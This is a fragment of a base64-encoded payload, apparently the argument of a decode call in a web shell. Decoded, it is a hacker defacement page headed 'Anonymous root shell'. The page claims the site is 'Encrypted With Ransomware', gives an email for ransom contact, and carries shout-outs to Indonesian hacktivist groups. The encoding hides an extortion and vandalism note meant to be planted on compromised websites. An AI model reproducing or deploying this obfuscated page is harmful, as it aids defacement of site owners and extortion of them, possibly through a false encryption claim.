iIgZm9udDo9IiIgaWQ9InRleHREZXN0aW5hdGlvbiIgbWFyZ2luOj0iIiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjpncmV5OyI+PC9kaXY+PC9iPiA8c2NyaXB0IGxhbmd1YWdlPSJKYXZhU2NyaXB0Ij4KamF2YXNjcmlwdDpzdGFydFR5cGluZyh0ZXh0LCAzNSwgInRleHREZXN0aW5hdGlvbiIpOwo8L3NjcmlwdD4KCjxmb3JtIG5hbWU9Im5ld3MiPgo8dGV4dGFyZWEgY29scz0iNzAiIG5hbWU9Im5ld3MyIiByb3dzPSIzIiB3cmFwPSJ2aXJ0dWFsIj48L3RleHRhcmVhPjwvZm9ybT4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgovLzwhW0NEQVRBWwp2YXIgbmV3c1RleHQgPSBuZXcgQXJyYXkoKTsKbmV3c1RleHRbMF0gPSAiLi5Bbm9ueW1vdXMgcm9vdCBzaGVsbCBieSBTYWQgQm95IDE5MjIiOwpuZXdzVGV4dFsxXSA9ICIuLi4uLy9UZWFtIE9mZiBzaWxlbnQgR2hvc3QgT3BlcmF0aW9uIEN5YmVyOykiOwpuZXdzVGV4dFsyXSA9ICIuLi4uPFtHYW1lIE92ZXIgYWRtaW5dPiI7Cm5ld3NUZXh0WzNdID0gIi4uLi4uWW91ciBTeXN0ZW0gaXMgdW5kZXIgQ29udHJvbCI7Cm5ld3NUZXh0WzRdID0gIi4uLldlIGFyZSBTaWxlbnQgR2hvc3QuLi53ZSBhcmUgbm90IGhhY2tlciB3ZSBhcmUgbm90IGRlZmFjZXIuLldlIGFyZSBwcm9mZXNpb25hbCBzZWN1cml0eSI7Cm5ld3NUZXh0WzVdID0gIi4uLi4uLy9Zb3VyIFNpdGUgSGFzcyBCZWVuIEVuY3J5cHRlZCBXaXRoIFJhbnNvbXdhcmUiOwpuZXdzVGV4dFs2XSA9ICIuLi5Db250YWN0IE1lIE9uIEVtYWlsOnJheXcxOTIyQGdtYWlsLmNvbSI7Cm5ld3NUZXh0WzddID0gIi4uV2UgYXJlIFNpbGVudCBHaG9zdC4uLi5XZSBhcmUgSWxsdXNpb24uLndlIGFyZSBTaWxlbnQiOwpuZXdzVGV4dFs4XSA9ICIuLi4uTm90IEZvdW5kISEhISEiOwpuZXdzVGV4dFs5XSA9ICIgLi4uLi8vSGF2ZSBhIG5pY2UgZGF5OikhIjsKdmFyIHR0bG9vcCA9IDE7IC8vIGRpdWxhbmctdWxhbmcgdGVrc255YSBnYW50aSBkZW5nYW4gMSAoMSA9IFRydWU7IDAgPSBGYWxzZSkKdmFyIHRzcGVlZCA9IDc1OyAvLyBrZWNlcGF0YW4gbmdldGlrIChsYXJnZXIgbnVtYmVyID0gc2xvd2VyKQp2YXIgdGRlbGF5ID0gMTA7IC8vIHdha3R1IG5nZXRpawovLyAtLS0tLS0tLS0tLS0tIERpIGxhcmFuZyBlZGl0IGJhbmdzYWQgLS0tLS0tLS0tLS0tLQp2YXIgZHdBVGV4dCwgY25ld3M9MCwgZWxpbmU9MCwgY2NoYXI9MCwgbXhUZXh0OwpmdW5jdGlvbiBkb05ld3MoKSB7Cm14VGV4dCA9IG5ld3NUZXh0Lmxlbmd0aCAtIDE7CmR3QVRleHQgPSBuZXdzVGV4dFtjbmV3c107CnNldFRpbWVvdXQoImFkZENoYXIoKSIsMTAwMCkKfQpmdW5jdGlvbiBhZGROZXdzKCkgewpjbmV3cyArPSAxOwppZiAoY25ld3MgPD0gbXhUZXh0KSB7CmR3QVRleHQgPSBuZXdzVGV4dFtjbmV3c107CmlmIChkd0FUZXh0Lmxlbmd0aCAhPSAwKSB7CmRvY3VtZW50Lm5ld3MubmV3czIudmFsdWUgPSAiIjsKZWxpbmUgPSAwOwpzZXRUaW1lb3V0KCJhZGRDaGFyKCkiLHRzcGVlZCkKfQp9Cn0KZnVuY3Rpb24gYWRkQ2hhcigpIHsKaWYgKGVsaW5lIT0xKSB7CmlmIChjY2hhciAhPSBkd0FUZXh0Lmxlbmd0aCkgewpubXR0eHQgPSAiIjsgZm9yICh2YXIgaz0wOyBrPD1jY2hhcjtrKyspIG5tdHR4dCArPSBkd0FUZXh0LmNoYXJBdChrKTsKZG9jdW1lbnQubmV3cy5uZXdzMi52YWx1ZSA9IG5tdHR4dDsKY2NoYXIgKz0gMTsKaWYgKGNjaGFyICE9IGR3QVRleHQubGVuZ3RoKSBkb2N1bWVudC5uZXdzLm5ld3MyLnZhbHVlICs9ICJfIjsKfSBlbHNlIHsKY2NoYXIgPSAwOwplbGluZSA9IDE7Cn0KaWYgKG14VGV4dD09Y25ld3MgJiYgZWxpbmUhPTAgJiYgdHRsb29wIT0wKSB7CmNuZXdzID0gMDsgc2V0VGltZW91dCgiYWRkTmV3cygpIix0ZGVsYXkpOwp9IGVsc2Ugc2V0VGltZW91dCgiYWRkQ2hhcigpIix0c3BlZWQpOwp9IGVsc2UgewpzZXRUaW1lb3V0KCJhZGROZXdzKCkiLHRkZWxheSkKfQp9CmRvTmV3cygpCi8vXV0+Cjwvc2NyaXB0Pgo8Zm9udCBjb2xvcj0id2hpdGUiIHN0eWxlPSJ0ZXh0LXNoYWRvdzogM3B4IDNweCA5cHggYXF1YTsiPgo8cHJlPgo8Y2VudGVyPjxGT05UIENPTE9SPSJ3aGl0ZSI+PEZPTlQgU0laRT0xND5HcmV0cyA6PC9GT05UPjwvY2VudGVyPgo8bWFycXVlZT48Y2VudGVyPjxGT05UIENPTE9SPSJ3aGl0ZSI+PEZPTlQgU0laRT0xMD5TaWxlbnQgR2hvc3QgLVB1cndvcmVqbyBHZXRhciAtQmFueXVtYXMgQ3liZXIgVGVhbSAtRWxlY3Ryb25pYyBUaHVuZGVyYm9sdCAtQmxhY2sgQ29kZXIgQ3J1c2ggLURhcmsgRXhwbG9pdCBDeWJlciAtQW5vbkdob3N0IC1IYWNrZXIgcGF0YWgtaGF0aSAtTXVzbGltIEN5YmVyIFNlY3VyaXR5IC1QYW5kYSA3dzcgLVRhbmdlcmFuZyBCbGFja2hhdCAtSW5kb1hwbG9pdCAtRm91c2ggQXJteSBIYWNrdGl2aXN0IC1CbGFja2hhdCBIYWNrZXIgSW5kb25lc2lhIC1JbmRvbmVzaWFuIEZpZ2h0ZXIgQ3liZXIgLUFuZCBhbGwgSGFja3RpdmlzdCBPbiBpbmRvbmVzaWFuPC9GT05UPjwvY2VudGVyPjwvbWFycXVlZT4KICA8YnI+PGJyPjxjZW50ZXI+PGZvbnQgc2l6ZT0yNj5Zb3VyIFNpdGUgSGFzcyBCZWVuIEVuY3J5cHRlZCBXaXRoIDxmb250IGNvbG9yPSJyZWQiPlJhbnNvbXdhcmU8L2ZvbnQ+ICAgUGxlYXNlIENvbnRhY3QgbWUgb24gZSBtYWlsOnJheXcxOTIyQGdtYWlsLmNvbTwvZm9udD48L2NlbnRlcj4KICAgICAgICA8YnI+PGJyPjxjZW50ZXI+PGZvbnQgc2l6ZT0yNj5SYW5zb213YXJlIHwgSGFja2VyIHwgQ3liZXIgVmFuZGFsaXNtIHwgQ3liZXIgQXJ0IHwgPGZvbnQgY29sb3I9InJlZCI+V2VhayBTZWN1cml0eTwvZm9udD4gfCBBZ2FpbnN0IEN5YmVyIENyaW1lPC9mb250PjwvY2VudGVyPgogICAgICAgIDxicj48YnI+RGVhciBhZG1pbjpZb3VyIFNpdGUgaGFhcyBiZWVuIGVuY3J5cHRlZCB3aXRoIHJhbnNvbXdhcmUuLkRvbnQgcGFuaWMhISEuLkNvbnRhY3QgbWUgb24gZS1tYWlsOnJheXcxOTIyQGdtYWlsLmNvbSAgPGJyPjxicj4KCjwvdGFibGU+Cjx0YWJsZSBib3JkZXI9NiB3aWR0aD0xMDAlPjx0ZCB3aWR0aD0yNSUgYWxpZ249cmlnaHQ+PGZvbnQgY29sb3I9YXF1YSBzaXplPTQgZmFjZT0iY29taWMgc2FucyBtcyI+PHRkIGhlaWdodD0iMTAiIGFsaWduPSJsZWZ0IiBjbGFzcz0idGQxIj48L3RkPjwvdHI+PC9GT05UPjwvY2VudGVyPgogICAgICAgIDx0ZCBoZWlnaHQ9IjEwIiBhbGlnbj0ibGVmdCIgY2xhc3M9InRkMSI+PC90ZD48L3RyPjx0cj48dGQgCiAgICAgICAgd2lkdGg9IjEwMCUiIGFsaWduPSJjZW50ZXIiIHZhbGlnbj0idG9wIiByb3dzcGFuPSIxIj48Zm9udCAKICAgICAgICBjb2xvcj0iYXF1YSIgZmFjZT0iY29taWMgc2FucyBtcyJzaXplPSIxIj48Yj4gCiAgICAgICAgPGZvbnQgY29sb3I9YXF1YT4gCiAgICAgICAgWz09PT09PT09PT09PT09PT09PT09PT09PT1fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX188L2ZvbnQ+PGZvbnQgY29sb3I9cmVkPl9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fPC9mb250Pjxmb250IGNvbG9yPWFxdWE+X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fPT09PT09PT09PT09PT09PT09PT09PT09PV08L2ZvbnQ+PGJyPjxmb250IGNvbG9yPWFxdWE+PGJyPgo8Y2VudGVyPjxGT05UIENPTE9SPSJ3aGl0ZSI+PEZPTlQgU0laRT0xND5NeSBGcmllbmQ6PC9GT05UPjwvY2VudGVyPgo8bWFycXVlZT48Y2VudGVyPjxGT05UIENPTE9SPSJ3aGl0ZSI+PEZPTlQgU0laRT0xMD4tQWNoaWxlcyAtTXIuTWF4IC1NYXJzaGFsbCAxMS5qIC1WYW5kaWFsc3RlciAtTXIuQmxhY2sgSGF0aW8gLVp4IFBob2VuaXggLUdsYWR5cyAtVmFuX1p1aWREZSAtbXIubc6xwqbCp0AgLWtpbmcgc2FsbWFuIC1Nci5ONHc0TnU2IC1LSVlBWV9EQU4gLU9jYS1PY2EgLU1yLlNvVXJjaElELyAtRlIwNUggLUFub24gd29sZiAtTWljcm8gY2xvbmUgLWlibnUgc3lhd2FsIC1vbWVzdCAtZW5kcmlhbiB6ZW4gLVoweCBpZCAtTXJfQmw0Y0tfSDRUMTAgLVplaW4gaWQgLVBoYW50b20gQmxpdHogLVplbl9GaW5peCBhbmQgYWxsIGZyaWVuZDwvRk9OVD48L2NlbnRlcj48L21hcnF1ZWU+CjwvRk9OVD48L2NlbnRlcj48L21hcnF1ZWU+Cjx0YWJsZSBib3JkZXI9NiB3aWR0aD0xMDAlPjx0ZCB3aWR0aD0yNSUgYWxpZ249cmlnaHQ+PGZvbnQgY29sb3I9YXF1YSBzaXplPTQgZmFjZT0iY29taWMgc2FucyBtcyI+PHRkIGhlaWdodD0iMTAiIGFsaWduPSJsZWZ0IiBjbGFzcz0idGQxIj48L3RkPjwvdHI+PC9GT05UPjwvY2VudGVyPgogICAgICAgIDx0ZCBoZWlnaHQ9IjEwIiBhbGlnbj0ibGVmdCIgY2xhc3M9InRkMSI+PC90ZD48L3RyPjx0cj48dGQgCiAgICAgICAgd2lkdGg9IjEwMCUiIGFsaWduPSJjZW50ZXIiIHZhbGlnbj0idG9wIiByb3dzcGFuPSIxIj48Zm9udCAKICAgICAgICBjb2xvcj0iYXF1YSIgZmFjZT0iY29taWMgc2FucyBtcyJzaXplPSIxIj48Yj4gCiAgICAgICAgPGZvbnQgY29sb3I9YXF1YT4gCiAgICAgICAgWz09PT09PT09PT09PT09PT09PT09PT09PT1fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX188L2ZvbnQ+PGZvbnQgY29sb3I9cmVkPl9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fPC9mb250Pjxmb250IGNvbG9yPWFxdWE+X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fPT09PT09PT09PT09PT09PT09PT09PT09PV08L2ZvbnQ+PGJyPjxmb250IGNvbG9yPWFxdWE+PGJyPgoKPC9odG1sPgo="))){
